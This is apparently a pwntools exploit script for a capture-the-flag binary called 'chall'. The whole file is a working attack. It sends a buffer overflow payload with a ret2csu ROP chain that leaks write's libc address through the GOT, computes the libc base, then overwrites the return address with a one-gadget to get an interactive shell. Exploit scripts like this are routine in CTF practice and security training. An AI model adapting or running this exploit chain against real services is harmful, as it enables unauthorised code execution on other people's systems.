#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
#HOST = ''
#PORT = 

binf = ELF(bin_file)
libc = ELF('./libc.so.6')

def attack(io, **kwargs):
    exploit = p64(0x39)
    exploit += b'a' * 0x40
    exploit += p64(0x400a3a)
    exploit += p64(0)
    exploit += p64(1)
    exploit += p64(binf.got['write'])
    exploit += p64(1)
    exploit += p64(binf.got['write'])
    exploit += p64(16)
    exploit += p64(0x400a20)
    exploit += b'0' * 0x38
    exploit += p64(binf.sym.main)
    
    io.sendlineafter('> ', exploit)
    io.recvline()
    io.recvline()
    io.recvline()

    leak = unpack(io.recvuntil(b'\x00'), 'all')
    libc.address = leak - libc.sym.write
    info('libc_base = 0x{:08x}'.format(libc.address))

    onegad = [0x4f3d5, 0x4f432, 0x10a41c]
    addr_onegad = libc.address + onegad[0]

    io.sendlineafter('> ', p64(57) + b'a'*0x40 + p64(addr_onegad))

def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
